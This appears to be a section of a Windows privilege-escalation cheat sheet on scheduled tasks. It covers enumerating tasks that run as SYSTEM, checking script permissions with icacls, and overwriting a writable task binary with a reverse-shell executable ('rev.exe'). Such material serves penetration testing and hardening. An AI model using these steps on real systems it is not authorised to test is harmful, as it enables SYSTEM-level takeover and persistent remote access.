# SCHEDULED TASKS

### List scheduled tasks

```bash
schtasks /query /fo LIST /v
Get-ScheduledTask
```

> All scheduled tasks

**Why:** Tasks running as SYSTEM

<details>
<summary>Example Output</summary>

```
schtasks /query /fo LIST /v | findstr /i 'taskname\|run as\|task to run'
TaskName: \CustomBackup
Run As User: SYSTEM
Task To Run: C:\Scripts\backup.bat
(Runs as SYSTEM - check if script is writable)
```
</details>

---

### Writable task scripts

```bash
Check permissions on scripts referenced by tasks
icacls <script_path>
```

> Can you modify the script?

**Why:** Runs as task owner

<details>
<summary>Example Output</summary>

```
schtasks /query /fo LIST /v | findstr /i 'task\|run\|author'
TaskName: \Backup
Run As User: SYSTEM
Task To Run: C:\Scripts\backup.bat

icacls C:\Scripts\backup.bat
BUILTIN\Users:(F)  <- FULL CONTROL!
(Modify script, wait for execution)
```
</details>

---

### Task binary replacement

```bash
If task runs a binary you can overwrite
```

> Replace with reverse shell

**Why:** Waits for next scheduled run

<details>
<summary>Example Output</summary>

```
Task runs: C:\Scripts\app.exe
icacls C:\Scripts\app.exe -> Users:(F)

copy C:\temp\rev.exe C:\Scripts\app.exe /Y
(Wait for scheduled run or trigger manually)
```
</details>

---
